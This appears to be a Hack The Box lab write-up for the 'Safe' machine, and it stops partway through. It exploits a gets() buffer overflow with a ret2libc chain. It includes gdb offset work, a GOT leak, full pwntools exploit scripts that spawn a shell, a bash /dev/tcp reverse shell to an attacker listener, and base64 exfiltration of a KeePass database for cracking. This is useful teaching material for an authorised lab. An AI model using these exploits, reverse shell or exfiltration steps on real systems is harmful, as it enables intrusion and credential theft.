# Safe

```
kali@kali:~/htb/Safe$ sudo nmap -p- -sV -sC 10.129.1.173
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-08 11:20 EST
Nmap scan report for 10.129.1.173
Host is up (0.030s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     11:21:10 up 1 min, 0 users, load average: 0.05, 0.03, 0.01
|   DNSVersionBindReqTCP: 
|     11:21:05 up 1 min, 0 users, load average: 0.06, 0.03, 0.01
|   GenericLines: 
|     11:20:54 up 1 min, 0 users, load average: 0.07, 0.04, 0.01
|     What do you want me to echo back?
|   GetRequest: 
|     11:21:00 up 1 min, 0 users, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions: 
|     11:21:00 up 1 min, 0 users, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help: 
|     11:21:15 up 1 min, 0 users, load average: 0.05, 0.03, 0.01
|     What do you want me to echo back? HELP
|   NULL: 
|     11:20:54 up 1 min, 0 users, load average: 0.07, 0.04, 0.01
|   RPCCheck: 
|     11:21:00 up 1 min, 0 users, load average: 0.06, 0.03, 0.01
|   RTSPRequest: 
|     11:21:00 up 1 min, 0 users, load average: 0.06, 0.03, 0.01
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     11:21:15 up 1 min, 0 users, load average: 0.05, 0.03, 0.01
|_    What do you want me to echo back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.91%I=7%D=3/8%Time=60464EEC%P=x86_64-pc-linux-gnu%r(NUL
SF:L,3E,"\x2011:20:54\x20up\x201\x20min,\x20\x200\x20users,\x20\x20load\x2
SF:0average:\x200\.07,\x200\.04,\x200\.01\n")%r(GenericLines,63,"\x2011:20
SF::54\x20up\x201\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\
SF:.07,\x200\.04,\x200\.01\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20ech
SF:o\x20back\?\x20\r\n")%r(GetRequest,71,"\x2011:21:00\x20up\x201\x20min,\
SF:x20\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.03,\x200\.01
SF:\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20GET\x20/
SF:\x20HTTP/1\.0\r\n")%r(HTTPOptions,75,"\x2011:21:00\x20up\x201\x20min,\x
SF:20\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.03,\x200\.01\
SF:n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTIONS\x
SF:20/\x20HTTP/1\.0\r\n")%r(RTSPRequest,75,"\x2011:21:00\x20up\x201\x20min
SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.03,\x200\.
SF:01\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20OPTION
SF:S\x20/\x20RTSP/1\.0\r\n")%r(RPCCheck,3E,"\x2011:21:00\x20up\x201\x20min
SF:,\x20\x200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.03,\x200\.
SF:01\n")%r(DNSVersionBindReqTCP,3E,"\x2011:21:05\x20up\x201\x20min,\x20\x
SF:200\x20users,\x20\x20load\x20average:\x200\.06,\x200\.03,\x200\.01\n")%
SF:r(DNSStatusRequestTCP,3E,"\x2011:21:10\x20up\x201\x20min,\x20\x200\x20u
SF:sers,\x20\x20load\x20average:\x200\.05,\x200\.03,\x200\.01\n")%r(Help,6
SF:7,"\x2011:21:15\x20up\x201\x20min,\x20\x200\x20users,\x20\x20load\x20av
SF:erage:\x200\.05,\x200\.03,\x200\.01\n\nWhat\x20do\x20you\x20want\x20me\
SF:x20to\x20echo\x20back\?\x20HELP\r\n")%r(SSLSessionReq,64,"\x2011:21:15\
SF:x20up\x201\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.05,
SF:\x200\.03,\x200\.01\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x2
SF:0back\?\x20\x16\x03\n")%r(TerminalServerCookie,63,"\x2011:21:15\x20up\x
SF:201\x20min,\x20\x200\x20users,\x20\x20load\x20average:\x200\.05,\x200\.
SF:03,\x200\.01\n\nWhat\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?
SF:\x20\x03\n")%r(TLSSessionReq,64,"\x2011:21:15\x20up\x201\x20min,\x20\x2
SF:00\x20users,\x20\x20load\x20average:\x200\.05,\x200\.03,\x200\.01\n\nWh
SF:at\x20do\x20you\x20want\x20me\x20to\x20echo\x20back\?\x20\x16\x03\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.46 seconds

```


I do some enumeration on the web server. I don't find any directories, but in the source code, I find:

```
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

So we can download an app to analyze from the webpage. And then exploit it on port 1337?

I do some small tests on the port, with `nc 10.129.1.173 1337`

And it seems to just repeat back what I type. It says echo, but since it's apparently an app, it has to be something custom.

I download it from 10.129.1.173/myapp

And then I run Ghidra on it.

I find the main function:

```

undefined8 main(void)

{
  char local_78 [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
} 
```

And it takes 1000 bytes from the gets() function:

```
        00401184 48 8d 45 90     LEA        RAX=>local_78,[RBP + -0x70]
        00401188 be e8 03        MOV        ESI,0x3e8				; 1000
                 00 00
```

So we have a buffer of 112 characters. 

RAX is a scratch register, and holds values returned from functions. This is an extended register.

ESI is a scratch register, also used to pass function argument #2 in 64-bit.




I also find another function named test:

```

void test(void)

{
  code *UNRECOVERED_JUMPTABLE;
  
                    /* WARNING: Could not recover jumptable at 0x00401159. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  (*UNRECOVERED_JUMPTABLE)(&stack0xfffffffffffffff8);
  return;
}
```

But there is no RET call in the function:

```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined test()
             undefined         AL:1           <RETURN>
                             test                                            XREF[3]:     Entry Point(*), 00402060, 
                                                                                          00402108(*)  
        00401152 55              PUSH       RBP
        00401153 48 89 e5        MOV        RBP,RSP
        00401156 48 89 e7        MOV        RDI,RSP
        00401159 41 ff e5        JMP        R13
        0040115c 90              ??         90h
        0040115d 5d              ??         5Dh    ]
        0040115e c3              ??         C3h

```

I check the file with gdb-peda:

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

So NX(non-execute) is enabled, but PIE(Position Independent Executable) is disabled. NX will make it so when loaded in memory, no segments are both writable and executable. So we cant write code into a segment and execute it.

While PIE changes up the memory layout. So no PIE would mean the memory layout is static, which means virtual addresses stay the same.

Read more about executable security here: https://blog.siphos.be/2011/07/high-level-explanation-on-some-binary-executable-security/


I run the program with gdb-peda and confirm the offset:

```
gdb-peda$ set follow-fork-mode parent
gdb-peda$ pattern_create 150
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
gdb-peda$ r
Starting program:  
No executable file specified.
Use the "file" or "exec-file" command.
gdb-peda$ exec-file myapp
gdb-peda$ r
Starting program: /home/kali/htb/Safe/myapp 
[Detaching after vfork from child process 16121]
 06:39:57 up 1 day,  3:46,  1 user,  load average: 0.11, 0.08, 0.09

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ee1603 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x4052a0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA\n")
RDI: 0x7ffff7fb24c0 --> 0x0 
RBP: 0x414e414138414169 ('iAA8AANA')
RSP: 0x7fffffffe118 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAA'")
RIP: 0x4011ac (ret)
R8 : 0x99 
R9 : 0x0 
R10: 0x7ffff7feff40 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (xor    ebp,ebp)
R13: 0x7fffffffe1f0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1:    call   0x401030
   0x4011a6:    mov    eax,0x0
   0x4011ab:    leave  
=> 0x4011ac:    ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0:    push   r15
   0x4011b2:    mov    r15,rdx
   0x4011b5:    push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe118 ("AjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'")
0008| 0x7fffffffe120 ("AAkAAPAAlAAQAAmAARAAoAA'")
0016| 0x7fffffffe128 ("lAAQAAmAARAAoAA'")
0024| 0x7fffffffe130 ("ARAAoAA'")
0032| 0x7fffffffe138 --> 0x401100 (add    BYTE PTR [rax],al)
0040| 0x7fffffffe140 --> 0x0 
0048| 0x7fffffffe148 --> 0x792e21052da02494 
0056| 0x7fffffffe150 --> 0x401070 (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in ?? ()
gdb-peda$ pattern_offset AjAA9AAO
AjAA9AAO found at offset: 120
gdb-peda$ 
```

I create a new pattern at 120, and add 8 "I"'s to check:

```
gdb-peda$ pattern_create 120
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANA'
gdb-peda$ r
Starting program: /home/kali/htb/Safe/myapp 
[Detaching after vfork from child process 16129]
 06:41:51 up 1 day,  3:48,  1 user,  load average: 0.15, 0.08, 0.09

What do you want me to echo back? AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAIIIIIIII'
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAIIIIIIII

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ee1603 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x4052a0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAIIIIIIII\n")
RDI: 0x7ffff7fb24c0 --> 0x0 
RBP: 0x414e414138414169 ('iAA8AANA')
RSP: 0x7fffffffe118 ("IIIIIIII'")
RIP: 0x4011ac (ret)
R8 : 0x82 
R9 : 0x0 
R10: 0x7ffff7feff40 (<strcmp+4464>:     pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x401070 (xor    ebp,ebp)
R13: 0x7fffffffe1f0 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4011a1:    call   0x401030
   0x4011a6:    mov    eax,0x0
   0x4011ab:    leave  
=> 0x4011ac:    ret    
   0x4011ad:    nop    DWORD PTR [rax]
   0x4011b0:    push   r15
   0x4011b2:    mov    r15,rdx
   0x4011b5:    push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe118 ("IIIIIIII'")
0008| 0x7fffffffe120 --> 0x7ffff7fa0027 --> 0x162fff4c30800 
0016| 0x7fffffffe128 --> 0x7fffffffe1f8 --> 0x7fffffffe4dd ("/home/kali/htb/Safe/myapp")
0024| 0x7fffffffe130 --> 0x1f7f7aa48 
0032| 0x7fffffffe138 --> 0x40115f (push   rbp)
0040| 0x7fffffffe140 --> 0x0 
0048| 0x7fffffffe148 --> 0x5eeb4ef9cc3b56ee 
0056| 0x7fffffffe150 --> 0x401070 (xor    ebp,ebp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004011ac in ?? ()
gdb-peda$ 
```

My plan is to do a ret2libc attack. To do this I need to get the libc address of the target machine. So it's a two part attack. The first buffer overflow will leak the libc address, and the second will use that information to gain shell.

From ghidra, I already know that the functions I have available are:

```
__do_global_dtors_aux
__gmon_start__
__libc_csu_fini
__libc_csu_init
__libc_start_main
_dl_relocate_static_pie
_fini
_init
_start
deregister_tm_clones
frame_dummy
FUN_00401020
gets
gets
main
local_78
printf
printf
puts
puts
register_tm_clones
system
system
test
```

I fuddled around a bit until I discovered that I could use printf/puts/system to print the address of printf and then use that to figure out the main address of libc

I found some great resources like https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html and https://medium.com/hackstreetboys/encryptctf-2019-pwn-write-up-4-of-5-6fc5779d51fa




```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x401040 <system@plt>
gdb-peda$ x/i 0x401040 
   0x401040 <system@plt>:       jmp    QWORD PTR [rip+0x2fda]        # 0x404020 <system@got.plt>
gdb-peda$ p printf
$2 = {<text variable, no debug info>} 0x401050 <printf@plt>
gdb-peda$ x/i 0x401050
   0x401050:    jmp    QWORD PTR [rip+0x2fd2]        # 0x404028

```

You may notice the two acronyms behind system. plt, and got.

got is the Global Offset Table, and plt is the Process Linkage Table.

When a program is compiling, it does not know the address of system or printf. So it calls a location where we do know where it is. This is the plt section.

The plt section then looks up the address in libc from the got which is filled when the program is launched. More information here: https://www.youtube.com/watch?v=kUk5pw4w0h4

So the got has two entries, the static address plt uses to look it up, and then the full address to libc.

So we run a function. That points to the plt, and we jump there. plt then looks up the address of the function in libc from the got by checking what full address the static address points to.


So I got the plt address for system(0x401040) and the static got address for printf(0x404028) using the x/i command. Which is:


x = display memory contents at a given address

i = instruction

so x/i is get the memory contents and instruction.


The system call can also be replaced with the plt address of printf or puts. They will print the address instead of trying to run it as a command. For some reason, it did not work on this binary.



I then need a rop gadget:

```
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x0040120b : (b'5fc3')  pop rdi; ret
0x00401090 : (b'5f114000ff15562f0000f40f1f440000c3')    pop rdi; adc DWORD PTR [rax+0x0],eax; call QWORD PTR [rip+0x2f56] # 0x403ff0; hlt; nop DWORD PTR [rax+rax*1+0x0]; ret
```

in x64-bit systems, functions will generally take parametres from the rdi. While x86-bit systems take it directly from the stack.

So we need the pop rdi so we can pass whatver we want as an argument to the system call.


So now we can write the exploit(explanation below):

```
from pwn import *

context(os="linux", arch="amd64")

conn = remote("10.129.1.173", 1337)

buf = "A"*120

buf = bytes(buf, 'utf-8')

printf = p64(0x404028)
system = p64(0x401040)
rdi = p64(0x40120b)
main = p64(0x40115f)

payload = buf + rdi + printf + system + main

conn.recvline()
conn.sendline(payload)
r = conn.recvline().strip()[7:-11].ljust(8,b"\x00")
print(hex(u64(r)))

```


So the payload is 120 characters of buffer fodder.

Then we have the pop rdi address. Which overwrites the return address. Or the RIP(EIP) at the end of the stack. So once we have read all of the input, we return to pop rdi.

this will then pop the GOT address for printf into RDI, and then return again.

This return address will be the address of system. So we are storing the address of printf into the destination index(RDI). And then returning to system, which will load the RDI.

So system will read the contents of the got printf address. which is the full address, as we know from the got information earlier.

System will then attempt to run this as a command. For example, system("0x7ff66a823190"). This of course is not a valid command.

So it will print out an error message containing the address.

`-sh: 0x7ff66a823190: command not found.`

After the system command is done, we return yet again. And this time we return back to main.

This makes sure the program exits succesfully.

More can be read here: https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address


And we get the library address:

```
root@kali:/home/kali/htb/Safe# python3 exploit.py 
[+] Opening connection to 10.129.1.173 on port 1337: Done
0x7fc8e5f65190
root@kali:/home/kali/htb/Safe# python3 exploit.py 
[+] Opening connection to 10.129.1.173 on port 1337: Done
0x7f2ccf978190
root@kali:/home/kali/htb/Safe# python3 exploit.py 
[+] Opening connection to 10.129.1.173 on port 1337: Done
0x7ff66a823190
```

We can see that it changes everytime, but the last three hexadecimals are the same.

I googled libc lookup and clicked on https://libc.blukat.me

I entered printf and the three hex characters. And it results in a single match: libc6_2.24-11+deb9u4_amd64 

```
 libc6_2.24-11+deb9u4_amd64

	Symbol 		Offset 		Difference

	system 		0x03f480 	0x0
	printf 		0x04f190 	0xfd10
	open 		0x0db6e0 	0x9c260
	read 		0x0db900 	0x9c480
	write 		0x0db960 	0x9c4e0
	str_bin_sh 	0x161c19 	0x122799
```

So now we have the printf offset(0x04f190), and the bin_sh offset(0x161c19).


```
from pwn import *

context(os="linux", arch="amd64")

conn = remote("10.129.1.173", 1337)

buf = "A"*120

buf = bytes(buf, 'utf-8')

printf = p64(0x404028)
system = p64(0x401040)
rdi = p64(0x40120b)
main = p64(0x40115f)

payload = buf + rdi + printf + system + main

conn.recvline()
conn.sendline(payload)
r = conn.recvline().strip()[7:-11].ljust(8,b"\x00")
print(hex(u64(r)))

libc = u64(r)

printf_libc = 0x04f190

bin_sh = 0x161c19

libc_base = libc - printf_libc

sh = p64(bin_sh + libc_base)

payload2 = buf + rdi + sh + system

conn.recvline()
conn.sendline(payload2)
conn.interactive()
 
```

So now we need to replace the address of printf, with the string /bin/sh. Which will spawn a shell for us.

Again, we fill the buffer.

Pop the address of '/bin/sh' into the rdi.

return to system. System will load '/bin/sh' from rdi. And execute it.


```
root@kali:/home/kali/htb/Safe# python3 exploit.py 
[+] Opening connection to 10.129.1.173 on port 1337: Done
0x7fa473421190
[*] Switching to interactive mode
$ whoami
user
$ script /dev/null -c bash
Script started, file is /dev/null
user@safe:/$id
id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

The shell isn't the best, so I create a new connection with netcat and `bash -i >& /dev/tcp/10.10.14.13/1338 0>&1`

It didn't really help that much.

```
root@kali:~# nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.1.173 49566
$ python -c 'import pty; pty.spawn("/bin/bash")'
sh: 1: python: not found
$ script /dev/null -c bash
Script started, file is /dev/null
user@safe:/home/user$ ^Z
[1]+  Stopped                 nc -nlvp 1338
root@kali:~# stty -raw echo
root@kali:~# fg
nc -nlvp 1338
reset
reset
reset: unknown terminal type unknown
Terminal type? xterm
xterm
user@safe:/home/user$ export TERM=xterm
export TERM=xterm
user@safe:/home/user$ export SHELL=bash
export SHELL=bash
user@safe:/home/user$ ls -la
ls -la
total 11284
drwxr-xr-x 3 user user    4096 May 13  2019 .
drwxr-xr-x 3 root root    4096 May 13  2019 ..
lrwxrwxrwx 1 user user       9 May 13  2019 .bash_history -> /dev/null
-rw-r--r-- 1 user user     220 May 13  2019 .bash_logout
-rw-r--r-- 1 user user    3526 May 13  2019 .bashrc
-rw-r--r-- 1 user user 1907614 May 13  2019 IMG_0545.JPG
-rw-r--r-- 1 user user 1916770 May 13  2019 IMG_0546.JPG
-rw-r--r-- 1 user user 2529361 May 13  2019 IMG_0547.JPG
-rw-r--r-- 1 user user 2926644 May 13  2019 IMG_0548.JPG
-rw-r--r-- 1 user user 1125421 May 13  2019 IMG_0552.JPG
-rw-r--r-- 1 user user 1085878 May 13  2019 IMG_0553.JPG
-rwxr-xr-x 1 user user   16592 May 13  2019 myapp
-rw-r--r-- 1 user user    2446 May 13  2019 MyPasswords.kdbx
-rw-r--r-- 1 user user     675 May 13  2019 .profile
drwx------ 2 user user    4096 May 13  2019 .ssh
-rw------- 1 user user      33 May 13  2019 user.txt
```

There's a MyPasswords KeePass database. I google, and see that John could crack it.

So now I just need to transfer that file over to my local machine and run john on it.

I see that the machine has base64 installed:

```
user@safe:/home/user$ which base64
which base64
/usr/bin/base64
user@safe:/home/user$ cat MyPasswords.kdbx | base64 -w0
cat MyPasswords.kdbx | base64 -w0
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
user@safe:/home/user$ which md5sum
which md5sum
/usr/bin/md5sum
user@safe:/home/user$ md5sum MyPasswords.kdbx
md5sum MyPasswords.kdbx
50441bff6933383f7664324ed39504c8  MyPasswords.kdbx
user@safe:/home/user$ 
```

So -w0 is to wrap encoded lines after COLS character, and 0 disables line wrapping. I don't quite understand what that means, but it is used on binary files.

As can be seen here: https://ss64.com/bash/base64.html

So I just use that whenever I copy files.

And then on my machine, I just copy:

```
